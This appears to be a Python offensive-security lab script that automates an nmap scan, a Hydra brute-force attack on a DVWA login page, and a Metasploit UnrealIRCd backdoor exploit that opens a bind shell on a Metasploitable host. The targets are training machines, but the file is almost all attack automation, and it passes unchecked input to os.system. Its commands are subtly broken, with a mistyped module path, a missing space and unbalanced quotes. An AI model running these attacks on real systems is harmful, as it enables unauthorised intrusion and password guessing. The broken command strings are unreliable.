import nmap, os as s, time, tkinter as tk
# Version 1.5
# This function will port-scan selected host with chosen flags

# Define application base sizes
HEIGHT = 800
WIDTH = 900

def portscan():
    myscanner = nmap.PortScanner()          # initialize nmap object
    targ_addr = input("Enter your target address\nExample input: 192.168.0.1\n"
                      "192.168.0.0/24\n192.168.0.1 - 192.168.0.10\n""Target Address: ") # Accept options from user
    targ_port = input("Please enter your target port\nExample of 1 port: 80\n"
                      "Example of port range: 1-30000\nTarget port: ")
    args = ''
    decision = ''
    while decision != '1' and decision != '2' and decision != '3':
        decision = input('What type of scan would you like?: \n1- -sS Stealth Scan\n'
                         '2- -sT TCP connect scan\n3- -A includes'
                         ' useful information (recommended)\nMake Decision: ')
        if decision == '1':
            args = '-sS -sV -O'
        elif decision == '2':
            args = '-sT -sV -O'
        elif decision == '3':
           args = '-A'
        else:
            print('Invalid scan option')
    if decision == '1': # notify and commence scan
        print('Executing as\nnmap -sS -sV -O -p', targ_port, targ_addr)
    elif decision == '2':
        print('Executing as\nnmap -sT -sV -p', targ_port, targ_addr)
    else:
       print('Executing as\nnmap -A -p', targ_port, targ_addr)
    myscanner.scan(targ_addr, targ_port, args)
# output
    print('hosts', myscanner.all_hosts(), 'were scanned')
    print('host:', myscanner[str(targ_addr)], 'is', myscanner[str(targ_addr)].state(), 'and has hostname:',
          myscanner[str(targ_addr)].hostname())
    print('The following ports were discovered:', myscanner[str(targ_addr)].all_tcp())
    for info in myscanner[str(targ_addr)].all_tcp():
        a = myscanner[str(targ_addr)].tcp(info)
        print('Port',info, 'is', a['state'],'with', a['name'],'running on port // ', 'version:', a['version'])
    input('Press <ENTER> to return to menu')

# This function automatically brute-forces the dvwa website with selected wordlsit
def dvwa_brute():
    address = input('Please enter the address of dvwa website: ')
    if address == '' or address == 'quit':
        print('Quitting...')
    else:
        login_page = '"/dvwa/login.php'
        request_body = 'username=^USER^&password=^PASS^&Login=Login'
        error_message = 'Login failed"'
        wordlist = '/usr/share/wordlists/wfuzz/others/names.txt'
        passwordlist = '/usr/share/wordlists/wfuzz/others/common_pass.txt'
    # if wordlist_choice == '1':
    #     wordlist = '/usr/share/wordlists/wfuzz/general/common.txt'
    # elif wordlist_choice == '2':
    #     wordlist = '/usr/share/wordlists/wfuzz/general/medium.txt'
    # else:
    #     wordlist = '/usr/share/wordlists/wfuzz/general/big.txt'
    # Now build the command
        hydracommand = 'hydra -L ' + wordlist + ' -P ' + passwordlist + ' ' + address + ' http-post-form ' + login_page + \
                   ':' + request_body + ':' + error_message + ' -f'
        print('Executing Hydra as:\n', hydracommand)
        s.system(hydracommand)

def unreal_backdoor():
    host = input('Please enter the address of metasploitable: ')
    print('Connecting to IRTX metasploitable at', host)
    # Construct command line argumaents
    command = "/bin/bash -e msfconsole -x 'use exploit/unix/ird/unreal_ircd_3281_backdoor;set RHOSTS" + host + ";set payload cmd/unix/bind_perl;exploit"
    s.system(command)


